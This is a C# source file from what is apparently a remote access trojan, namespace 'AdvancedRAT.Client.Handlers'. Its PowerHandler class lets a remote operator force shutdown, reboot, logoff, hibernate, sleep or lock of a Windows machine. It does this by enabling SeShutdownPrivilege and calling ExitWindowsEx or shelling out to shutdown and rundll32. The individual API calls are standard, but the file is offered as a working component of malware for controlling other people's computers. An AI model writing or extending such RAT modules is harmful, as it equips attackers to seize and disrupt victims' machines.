using System;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace AdvancedRAT.Client.Handlers
{
    public class PowerHandler
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int ExitWindowsEx(uint uFlags, uint dwReason);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        
        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }
        
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_QUERY = 0x0008;
        private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        private const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";
        
        private const uint EWX_LOGOFF = 0x00000000;
        private const uint EWX_SHUTDOWN = 0x00000001;
        private const uint EWX_REBOOT = 0x00000002;
        private const uint EWX_FORCE = 0x00000004;
        private const uint EWX_POWEROFF = 0x00000008;
        private const uint EWX_FORCEIFHUNG = 0x00000010;
        
        public async Task<object> Shutdown(bool force = false)
        {
            try
            {
                EnableShutdownPrivilege();
                uint flags = EWX_SHUTDOWN | EWX_POWEROFF;
                if (force) flags |= EWX_FORCE;
                
                ExitWindowsEx(flags, 0);
                return new { success = true, message = "Shutdown initiated" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Reboot(bool force = false)
        {
            try
            {
                EnableShutdownPrivilege();
                uint flags = EWX_REBOOT;
                if (force) flags |= EWX_FORCE;
                
                ExitWindowsEx(flags, 0);
                return new { success = true, message = "Reboot initiated" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Logoff(bool force = false)
        {
            try
            {
                uint flags = EWX_LOGOFF;
                if (force) flags |= EWX_FORCE;
                
                ExitWindowsEx(flags, 0);
                return new { success = true, message = "Logoff initiated" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Hibernate()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "shutdown",
                    Arguments = "/h",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                
                return new { success = true, message = "Hibernate initiated" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Sleep()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "rundll32.exe",
                    Arguments = "powrprof.dll,SetSuspendState 0,1,0",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                
                return new { success = true, message = "Sleep initiated" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> Lock()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "rundll32.exe",
                    Arguments = "user32.dll,LockWorkStation",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
                
                return new { success = true, message = "Workstation locked" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        private void EnableShutdownPrivilege()
        {
            IntPtr tokenHandle;
            OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle);
            
            TOKEN_PRIVILEGES tkp = new TOKEN_PRIVILEGES();
            tkp.PrivilegeCount = 1;
            tkp.Attributes = SE_PRIVILEGE_ENABLED;
            
            LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, out tkp.Luid);
            AdjustTokenPrivileges(tokenHandle, false, ref tkp, 0, IntPtr.Zero, IntPtr.Zero);
        }
    }
}
